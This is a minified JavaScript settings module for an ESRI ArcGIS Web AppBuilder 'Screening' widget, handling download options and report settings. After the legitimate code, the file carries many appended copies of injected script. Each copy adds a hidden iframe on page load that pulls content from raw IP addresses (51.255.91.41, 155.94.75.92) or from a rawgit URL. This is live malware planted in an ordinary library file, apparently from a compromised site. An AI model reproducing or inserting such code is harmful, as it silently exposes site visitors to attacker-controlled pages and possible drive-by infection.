// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"url:widgets/Screening/setting/DownloadSettings.html":'\x3cdiv\x3e\r\n  \x3c!--Download Settings--\x3e\r\n  \x3cfieldset class\x3d"esriCTFieldSet esriCTDownloadTabFieldSet"\x3e\r\n    \x3clegend class\x3d"esriCTFieldSetLegend"\x3e${nls.downloadTab.downloadLegend}\x3c/legend\x3e\r\n    \x3c!--Sync enable download Option--\x3e\r\n    \x3cform data-dojo-attach-point\x3d"downloadOptionForm" class\x3d"esriCTDownloadOptionForm"\x3e\r\n      \x3c!--Sync-enable feature service option--\x3e\r\n      \x3cdiv class\x3d"esriCTSyncEnableOptionDiv"\x3e\r\n        \x3c!--Sync-enable radio button--\x3e\r\n        \x3cinput class\x3d"esriCTDownloadRadioButton" name\x3d"downloadOption" type\x3d"radio" data-dojo-type\x3d"jimu/dijit/RadioBtn" value\x3d"syncEnable"\r\n          checked\x3dtrue data-dojo-attach-point\x3d"syncEnableRadioButton"\x3e\r\n        \x3c!--Sync-enable download option label and hint container--\x3e\r\n        \x3cdiv class\x3d"esriCTDownloadLabelDiv"\x3e\r\n          \x3cdiv class\x3desriCTDownloadOptionLabel\x3e\r\n            ${nls.downloadTab.syncEnableOptionLabel}\r\n          \x3c/div\x3e\r\n          \x3cdiv class\x3d"esriCTHint"\x3e\r\n            ${nls.downloadTab.syncEnableOptionHint}\x3cbr\x3e${nls.downloadTab.syncEnableOptionNote}\r\n          \x3c/div\x3e\r\n        \x3c/div\x3e\r\n      \x3c/div\x3e\r\n      \x3c!--Table representation of download file options for each layer--\x3e\r\n      \x3cdiv class\x3d"esriCTLayerDownloadOptionTable" data-dojo-attach-point\x3d"downloadOptionTable"\x3e\r\n      \x3c/div\x3e\r\n      \x3c!--Extract data task geoprocessing service option--\x3e\r\n      \x3cdiv class\x3d"esriCTGPServiceOptionDiv"\x3e\r\n        \x3c!--Extract data task radio button--\x3e\r\n        \x3cinput class\x3d"esriCTDownloadRadioButton" name\x3d"downloadOption" type\x3d"radio" data-dojo-type\x3d"jimu/dijit/RadioBtn" value\x3d"extractDataTask"\r\n          data-dojo-attach-point\x3d"gpServiceRadioButton"\x3e\r\n        \x3c!--Extract data task download option label and hint container--\x3e\r\n        \x3cdiv class\x3d"esriCTDownloadLabelDiv"\x3e\r\n          \x3cdiv class\x3desriCTDownloadOptionLabel\x3e\r\n            ${nls.downloadTab.extractDataTaskOptionLabel}\r\n          \x3c/div\x3e\r\n          \x3cdiv class\x3d"esriCTHint"\x3e\r\n            ${nls.downloadTab.extractDataTaskOptionHint}\r\n          \x3c/div\x3e\r\n        \x3c/div\x3e\r\n      \x3c/div\x3e\r\n      \x3c!--Extract data task INPUT Container--\x3e\r\n      \x3cdiv class\x3d"esriCTDownloadTabInputContainer esriCTHidden" data-dojo-attach-point\x3d"extractDataTaskInputContainer"\x3e\r\n        \x3c!--Extract data task INPUT TEXTBOX label--\x3e\r\n        \x3cdiv class\x3d"esriCTDownloadTabLabel"\x3e\r\n          ${nls.downloadTab.GPTaskLabel}\r\n        \x3c/div\x3e\r\n        \x3c!--Extract data task TEXTBOX--\x3e\r\n        \x3cdiv data-dojo-attach-point\x3d"extractDataTaskTextBox" class\x3d"esriCTDownloadTabTextbox" data-dojo-type\x3d"dijit/form/ValidationTextBox"\r\n          data-dojo-props\x3d\'required:true,trim:true,disabled:true\'\x3e\r\n        \x3c/div\x3e\r\n        \x3c!--Set Button--\x3e\r\n        \x3cdiv class\x3d"jimu-btn jimu-float-trailing esriCTDownloadTabSetButton" data-dojo-attach-point\x3d"extractDataTaskSetButton" title\x3d"${nls.downloadTab.setButtonLabel}"\x3e\r\n          ${nls.downloadTab.setButtonLabel}\r\n        \x3c/div\x3e\r\n      \x3c/div\x3e\r\n      \x3c!--User cannot download--\x3e\r\n      \x3cdiv class\x3d"esriCTCannotDownloadOptionDiv"\x3e\r\n        \x3c!--User cannot download radio button--\x3e\r\n        \x3cinput class\x3d"esriCTDownloadRadioButton" name\x3d"downloadOption" type\x3d"radio" data-dojo-type\x3d"jimu/dijit/RadioBtn" value\x3d"cannotDownload"\r\n          data-dojo-attach-point\x3d"cannotDownloadRadioButton"\x3e\r\n        \x3c!--User cannot download option label div--\x3e\r\n        \x3cdiv class\x3d"esriCTDownloadLabelDiv"\x3e\r\n          \x3cdiv class\x3desriCTDownloadOptionLabel\x3e\r\n            ${nls.downloadTab.cannotDownloadOptionLabel}\r\n          \x3c/div\x3e\r\n        \x3c/div\x3e\r\n      \x3c/div\x3e\r\n    \x3c/form\x3e\r\n  \x3c/fieldset\x3e\r\n  \x3c!--Report Settings--\x3e\r\n  \x3cfieldset class\x3d"esriCTFieldSet esriCTDownloadTabFieldSet"\x3e\r\n    \x3clegend class\x3d"esriCTFieldSetLegend"\x3e${nls.downloadTab.reportLegend}\x3c/legend\x3e\r\n    \x3cdiv class\x3d"esriCTReportSettingsContainer"\x3e\r\n      \x3c!--Print service URL container starts--\x3e\r\n      \x3cdiv class\x3d"esriCTDownloadTabInputContainer" data-dojo-attach-point\x3d"printGPServiceInputContainer"\x3e\r\n        \x3c!--Print Service url LABEL--\x3e\r\n        \x3cdiv class\x3d"esriCTDownloadTabLabel"\x3e\r\n          ${nls.downloadTab.printGPServiceLabel}\r\n        \x3c/div\x3e\r\n        \x3c!--Print Service url TEXTBOX--\x3e\r\n        \x3cdiv data-dojo-attach-point\x3d"printGPServiceTextBox" class\x3d"esriCTDownloadTabTextbox" data-dojo-type\x3d"dijit/form/ValidationTextBox"\r\n          data-dojo-props\x3d\'required:true,trim:true,disabled:true\'\x3e\r\n        \x3c/div\x3e\r\n        \x3c!--Set BUTTON--\x3e\r\n        \x3cdiv class\x3d"jimu-btn jimu-float-trailing esriCTDownloadTabSetButton" data-dojo-attach-point\x3d"printGPServiceSetButton" title\x3d"${nls.downloadTab.setButtonLabel}"\x3e\r\n          ${nls.downloadTab.setButtonLabel}\r\n        \x3c/div\x3e\r\n      \x3c/div\x3e\r\n      \x3c!--Print service URL container ends--\x3e\r\n      \x3c!--Logo chooser starts--\x3e\r\n      \x3cdiv class\x3d"esriCTLogoChooserMainContainer"\x3e\r\n        \x3cdiv class\x3d"esriCTDownloadTabLabel"\x3e\r\n          ${nls.downloadTab.logoLabel}\r\n        \x3c/div\x3e\r\n        \x3cdiv class\x3d"esriCTLogoChooserDiv"\x3e\r\n          \x3cdiv class\x3d"esriCTImageChooserPreviewContainer"\x3e\r\n            \x3cimg class\x3d"esriCTImageChooserPreview" data-dojo-attach-point\x3d"imageChooserPreview"\x3e\r\n            \x3cdiv class\x3d"esriCTLogoChooser" data-dojo-attach-point\x3d"logoChooserNode"\x3e\x3c/div\x3e\r\n          \x3c/div\x3e\r\n          \x3cdiv class\x3d"esriCTHint"\x3e\r\n            ${nls.downloadTab.logoChooserHint}\r\n          \x3c/div\x3e\r\n        \x3c/div\x3e\r\n      \x3c/div\x3e\r\n      \x3c!--Logo chooser ends--\x3e\r\n      \x3c!--Report Title container start--\x3e\r\n      \x3cdiv class\x3d"esriCTDownloadTabReportTitleContainer" data-dojo-attach-point\x3d"reportTitle"\x3e\r\n        \x3c!--Report Title  LABEL--\x3e\r\n        \x3cdiv class\x3d"esriCTDownloadTabLabel"\x3e\r\n          ${nls.downloadTab.reportTitleLabel}\r\n        \x3c/div\x3e\r\n        \x3c!--Report Title  TEXTAREA--\x3e\r\n        \x3cdiv data-dojo-attach-point\x3d"reportTitleTextBox" class\x3d"esriCTDownloadTabReportInputNode" data-dojo-type\x3d"dijit/form/ValidationTextBox"\x3e\r\n        \x3c/div\x3e\r\n      \x3c/div\x3e\r\n      \x3c!--Report Title container end--\x3e\r\n      \x3c!--Column title Color Picker container starts--\x3e\r\n      \x3cdiv class\x3d"esriCTDownloadTabReportTitleContainer" data-dojo-attach-point\x3d"reportTitle"\x3e\r\n        \x3cdiv class\x3d"esriCTDownloadTabLabel"\x3e\r\n          ${nls.downloadTab.columnTitleColorPickerLabel}\r\n        \x3c/div\x3e\r\n        \x3cdiv class\x3d"esriCTDownloadTabReportInputNode"\x3e\r\n          \x3cdiv class\x3d"esriCTColorPickerPreviewField" data-dojo-attach-point\x3d"columnTitleColorPickerNode"\x3e\r\n          \x3c/div\x3e\r\n        \x3c/div\x3e\r\n      \x3c/div\x3e\r\n      \x3c!--Column title Color Picker container ends--\x3e\r\n      \x3c!--Footnote container starts--\x3e\r\n      \x3cdiv class\x3d"esriCTFootnoteContainer"\x3e\r\n        \x3c!--Footnote LABEL--\x3e\r\n        \x3cdiv class\x3d"esriCTDownloadTabLabel"\x3e\r\n          ${nls.downloadTab.footnoteLabel}\r\n        \x3c/div\x3e\r\n        \x3c!--Footnote TEXTAREA--\x3e\r\n        \x3ctextarea class\x3d"esriCTFootnoteTextArea" data-dojo-attach-point\x3d"footnoteTextArea" rows\x3d"5"\x3e\x3c/textarea\x3e\r\n      \x3c/div\x3e\r\n      \x3c!--Footnote container ends--\x3e\r\n    \x3c/div\x3e\r\n  \x3c/fieldset\x3e\r\n\x3c/div\x3e'}});
define("dojo/_base/declare dijit/_WidgetsInTemplateMixin dojo/text!./DownloadSettings.html dojo/_base/array dojo/dom-class dojo/_base/lang dojo/on dojo/query dojo/dom-attr dojo/_base/html dojo/dom-construct dojo/string dojo/_base/Color jimu/BaseWidgetSetting jimu/dijit/CheckBox jimu/dijit/SimpleTable jimu/dijit/GpSource jimu/dijit/Popup jimu/dijit/Message jimu/dijit/ImageChooser jimu/portalUtils jimu/dijit/ColorPicker esri/request jimu/dijit/RadioBtn dijit/form/ValidationTextBox".split(" "),function(r,
t,u,l,f,e,g,h,n,p,k,v,w,x,y,z,q,A,B,m,C,D,E){return r([x,t],{templateString:u,baseClass:"jimu-widget-screening-download-settings",map:null,loadingIndicator:null,downloadOptions:null,_layerIndex:0,_layers:[],_extractDataTaskDownloadOptions:[],_extractDataTaskURL:"",_printTaskURL:"",_logo:"",_tableHeaderColor:null,constructor:function(a){this.downloadOptions=this.loadingIndicator=this.map=null;this._layerIndex=0;this._layers=[];this._extractDataTaskDownloadOptions=[];this._logo=this._printTaskURL=this._extractDataTaskURL=
"";this._tableHeaderColor=null;e.mixin(this,a)},postCreate:function(){var a,b,c,d,f;this._initSyncEnableOptionTable();this._syncEnableOptionTable&&(this._layers=[],this._syncEnableOptionTable.clear());this.downloadOptions&&this.downloadOptions.layers&&(this._layers=this.downloadOptions.layers,l.forEach(this.downloadOptions.layers,e.hitch(this,function(a){this._setFileOptionDataInTable(a)})));this.downloadOptions&&this.downloadOptions.type&&this._chooseDownloadOption(this.downloadOptions.type,!0);
this._attachDownloadOptionEvent();this.reportSettings&&this.reportSettings.printTaskURL&&""!==this.reportSettings.printTaskURL?(this.printGPServiceTextBox.set("value",this.reportSettings.printTaskURL),this._printTaskURL=this.reportSettings.printTaskURL):(f=C.getPortal(this.appConfig.portalUrl).helperServices)&&f.printTask.url&&(this.printGPServiceTextBox.set("value",f.printTask.url),this._printTaskURL=f.printTask.url);this.reportSettings&&this.reportSettings.footnote&&""!==this.reportSettings.footnote&&
(this.footnoteTextArea.value=this.reportSettings.footnote);a={portalUrl:this.appConfig.portalUrl};this.own(g(this.extractDataTaskSetButton,"click",e.hitch(this,function(){b=new q(a);d=this._onSetButtonClick(b);this._attachExtractDataTaskGPSourceEvents(b,d)})));this.own(g(this.printGPServiceSetButton,"click",e.hitch(this,function(){c=new q(a);d=this._onSetButtonClick(c);this._attachPrintReportGPSourceEvents(c,d)})));this._initImageChooser();this._tableHeaderColor=this._createColorPicker(this.reportSettings.columnTitleColor,
this.columnTitleColorPickerNode);this.reportTitleTextBox.set("value",this.reportSettings.reportTitle)},_attachExtractDataTaskGPSourceEvents:function(a,b){this.own(g(a,"ok",e.hitch(this,function(a){a&&0<a.length&&a[0].url&&this._requestExtractDataTaskURLInfo(a[0].url,b)})));this.own(g(a,"cancel",e.hitch(this,function(){b.close()})))},getExtractDataTaskURL:function(){return this._extractDataTaskURL?this._extractDataTaskURL:""},_attachPrintReportGPSourceEvents:function(a,b){this.own(g(a,"ok",e.hitch(this,
function(a){a&&0<a.length&&a[0].url?(this.printGPServiceTextBox.set("value",a[0].url),this._printTaskURL=a[0].url):(this.printGPServiceTextBox.set("value",""),this._printTaskURL="");b.close()})));this.own(g(a,"cancel",e.hitch(this,function(){b.close()})))},_initSyncEnableOptionTable:function(){this._syncEnableOptionTable=new z({fields:[{name:this.nls.downloadTab.syncEnableTableHeaderTitle.layerNameLabel,title:this.nls.downloadTab.syncEnableTableHeaderTitle.layerNameLabel,type:"empty",width:"40%"},
{name:this.nls.downloadTab.syncEnableTableHeaderTitle.csvFileFormatLabel,title:this.nls.downloadTab.syncEnableTableHeaderTitle.csvFileFormatLabel,"class":"esriCTTableHeader",type:"empty",width:"15%"},{name:this.nls.downloadTab.syncEnableTableHeaderTitle.fileGDBFormatLabel,title:this.nls.downloadTab.syncEnableTableHeaderTitle.fileGDBFormatLabel,"class":"esriCTTableHeader",type:"empty",width:"15%"},{name:this.nls.downloadTab.syncEnableTableHeaderTitle.allowDownloadLabel,title:this.nls.downloadTab.syncEnableTableHeaderTitle.allowDownloadLabel,
"class":"esriCTTableHeader",type:"empty",width:"15%"}],selectable:!1});this._syncEnableOptionTable.placeAt(this.downloadOptionTable);this._syncEnableOptionTable.startup()},_setFileOptionDataInTable:function(a){var b;b=this._syncEnableOptionTable.addRow({});b.success&&b.tr&&(this._addLayerTitle(b.tr,a.layerName),this._addFileOption(b.tr,1),1<a.downloadingFileOption.join().split("filegdb").length&&this._addFileOption(b.tr,2),this._addAllowDownloadCheckbox(b.tr,a))},checkLayerForDownloadOptions:function(a,
b){var c,d;d=this._getTableRow(b);d.success&&d.tr&&(c={url:a.url,layerName:a.layerName,id:a.id,allowDownload:!0},this._addLayerTitle(d.tr,a.layerName),this._addFileOption(d.tr,1),c.downloadingFileOption=[],c.downloadingFileOption.push("csv"),1<a.capabilities.split("Sync").length&&10.4<=a.layerVersion&&(this._addFileOption(d.tr,2),c.downloadingFileOption.push("filegdb")),this._addAllowDownloadCheckbox(d.tr,c),this._setLayerDownloadInfo(c,b))},_getTableRow:function(a){-1<a&&this._syncEnableOptionTable.tbody.rows[a]?
(a={tr:this._syncEnableOptionTable.tbody.rows[a],success:!0},this._removeFileOptions(a.tr)):a=this._syncEnableOptionTable.addRow({});return a},_setLayerDownloadInfo:function(a,b){-1<b?this._layers.splice(b,1,a):this._layers.push(a)},_addLayerTitle:function(a,b){if(a=h(".simple-table-cell",a)[0])a.innerHTML=b},_removeFileOptions:function(a){var b;a=h(".simple-table-cell",a);for(b=1;4>b;b++)f.remove(a[b],"esriCTAvailableDownloadOption")},_addFileOption:function(a,b){(a=h(".simple-table-cell",a)[b])&&
f.add(a,"esriCTAvailableDownloadOption")},_addAllowDownloadCheckbox:function(a,b){var c;if(a=h(".simple-table-cell",a)[3])k.empty(a),c=new y({checked:b.allowDownload,"class":"esriCTAllowDownloadCheckbox"}),c.placeAt(a),this.own(g(c,"change",e.hitch(this,function(){b.allowDownload=n.get(c,"checked")})))},_attachDownloadOptionEvent:function(){var a,b;b=h("input[type\x3dradio]:checked",this.downloadOptionForm)[0].value;a=h("input",this.downloadOptionForm);l.forEach(a,e.hitch(this,function(a){this.own(g(a,
"click",e.hitch(this,function(c){a.value!==b&&(this._chooseDownloadOption(c.currentTarget.value,!1),b=c.currentTarget.value)})))}))},_chooseDownloadOption:function(a,b){switch(a){case "syncEnable":this.syncEnableRadioButton.set("checked",!0);f.remove(this.downloadOptionTable,"esriCTHidden");f.add(this.extractDataTaskInputContainer,"esriCTHidden");b&&this._resetExtractDataTaskOption(!0);break;case "extractDataTask":this.gpServiceRadioButton.set("checked",!0);f.add(this.downloadOptionTable,"esriCTHidden");
f.remove(this.extractDataTaskInputContainer,"esriCTHidden");b&&this.downloadOptions&&this.downloadOptions.extractDataTaskURL&&this._resetExtractDataTaskOption(!1);break;case "cannotDownload":this.cannotDownloadRadioButton.set("checked",!0),f.add(this.downloadOptionTable,"esriCTHidden"),f.add(this.extractDataTaskInputContainer,"esriCTHidden"),b&&this._resetExtractDataTaskOption(!0)}},getLayers:function(){return this._layers},deleteRow:function(a){this._syncEnableOptionTable.deleteRow(this._syncEnableOptionTable.tbody.rows[a]);
this._layers.splice(a,1)},rowUp:function(a){var b,c;-1<a&&this._syncEnableOptionTable.tbody.rows[a+1]&&(p.place(this._syncEnableOptionTable.tbody.rows[a],this._syncEnableOptionTable.tbody.rows[a+1],"after"),this._syncEnableOptionTable.updateUI(),b=this._layers[a],c=this._layers[a+1],this._layers.splice(a,2,c,b))},rowDown:function(a){var b,c;a<this._syncEnableOptionTable.tbody.rows.length&&this._syncEnableOptionTable.tbody.rows[a-1]&&(p.place(this._syncEnableOptionTable.tbody.rows[a],this._syncEnableOptionTable.tbody.rows[a-
1],"before"),this._syncEnableOptionTable.updateUI(),b=this._layers[a],c=this._layers[a-1],this._layers.splice(a-1,2,b,c))},_onSetButtonClick:function(a){return new A({titleLabel:this.nls.downloadTab.setGPTaskTitle,width:830,height:560,content:a})},_requestExtractDataTaskURLInfo:function(a,b){var c;c=!1;this.loadingIndicator.show();E({url:a+"?f\x3dpjson"}).then(e.hitch(this,function(d){(c=this._validateExtractDataTask(d))?(this.extractDataTaskTextBox.set("value",a),this._extractDataTaskURL=a):(this._showMessage(this.nls.downloadTab.errorMessages.invalidGPTaskURL),
this.extractDataTaskTextBox.set("value",""),this._extractDataTaskURL="");b.close();this.loadingIndicator.hide()}),e.hitch(this,function(){this._showMessage(this.nls.downloadTab.errorMessages.invalidGPTaskURL);this.extractDataTaskTextBox.set("value","");this._extractDataTaskURL="";this.loadingIndicator.hide();b.close()}))},_validateExtractDataTask:function(a){var b,c,d;b=c=d=!1;return a&&"esriExecutionTypeAsynchronous"===a.executionType&&(l.forEach(a.parameters,e.hitch(this,function(a){switch(a.name){case "Area_of_Interest":b=
this._checkAOIParam(a);break;case "Feature_Format":c=this._checkFeatureFormatParam(a);break;case "Output_Zip_File":d=this._checkOutputParam(a)}})),b&&c&&d)?!0:!1},_checkAOIParam:function(a){return"GPFeatureRecordSetLayer"===a.dataType?a.defaultValue&&"esriGeometryPolygon"!==a.defaultValue.geometryType?!1:!0:!1},_checkFeatureFormatParam:function(a){var b;b=!1;this._extractDataTaskDownloadOptions=[];return"GPString"===a.dataType&&a.choiceList&&0<a.choiceList.length?(this._extractDataTaskDownloadOptions.push("csv"),
-1<a.choiceList.indexOf("File Geodatabase - GDB - .gdb")&&(this._extractDataTaskDownloadOptions.push("filegdb"),b=!0),-1<a.choiceList.indexOf("Shapefile - SHP - .shp")&&(this._extractDataTaskDownloadOptions.push("shapefile"),b=!0),b):!1},_checkOutputParam:function(a){return"GPDataFile"===a.dataType?!0:!1},_showMessage:function(a){(new B({message:a})).message=a},getDownloadingFileOptions:function(){var a,b;b=[];a=h("input[type\x3dradio]:checked",this.downloadOptionForm)[0].value;"syncEnable"===a?b=
this._getSyncEnableDownloadingOptions(this._layers):"extractDataTask"===a&&(b=this._extractDataTaskDownloadOptions);return b},_getSyncEnableDownloadingOptions:function(a){var b;b=[];l.some(a,e.hitch(this,function(a){a.allowDownload&&l.some(a.downloadingFileOption,e.hitch(this,function(a){-1===b.indexOf(a)&&"shapefile"!==a&&b.push(a)}))}));return b},getPrintReportGPServiceURL:function(){return this._printTaskURL?this._printTaskURL:""},getReportTitle:function(){return this.reportTitleTextBox.value},
getTableHeaderColor:function(){var a=this._tableHeaderColor.color.toHex();return a?a:""},getFootnoteForReport:function(){return this.footnoteTextArea.value?this.footnoteTextArea.value:""},_initImageChooser:function(){this.logoChooser=new m({cropImage:!1,showSelfImg:!1,goldenWidth:50,goldenHeight:50,displayImg:this.imageChooserPreview,format:[m.GIF,m.PNG,m.JPEG]});this.logoChooser.placeAt(this.logoChooserNode);this._createLogoPreview();f.add(this.logoChooser.domNode,"esriCTImageChooserContent")},_createLogoPreview:function(){var a,
b;a=this.folderUrl+"/images/default-logo.png";this.reportSettings&&this.reportSettings.logo&&(b=this.reportSettings.logo,-1<b.indexOf("${appPath}")?(a=this.folderUrl.slice(0,this.folderUrl.lastIndexOf("widgets")),a=v.substitute(b,{appPath:a})):a=b);n.set(this.imageChooserPreview,"src",a)},getLogo:function(){return this.logoChooser&&this.logoChooser.imageData?this.logoChooser.getImageData():this.reportSettings&&this.reportSettings.logo?this.reportSettings.logo:"${appPath}/widgets/Screening/images/default-logo.png"},
_resetExtractDataTaskOption:function(a){a?(this.extractDataTaskTextBox.set("value",""),this._extractDataTaskURL="",this._extractDataTaskDownloadOptions=[]):(this.extractDataTaskTextBox.set("value",this.downloadOptions.extractDataTaskURL),this._extractDataTaskURL=this.downloadOptions.extractDataTaskURL,this._extractDataTaskDownloadOptions=this.downloadOptions.downloadingFileOptions)},_createColorPicker:function(a,b){b=k.create("table",{cellspacing:"0",cellpadding:"0"},b);b=k.create("tr",{style:"height:30px"},
b);k.create("td",{},b);b=k.create("td",{},b);b=k.create("div",{"class":"esriCTColorChooserNode"},b);b=new D(null,k.create("div",{},b));b.setColor(new w(a));return b}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});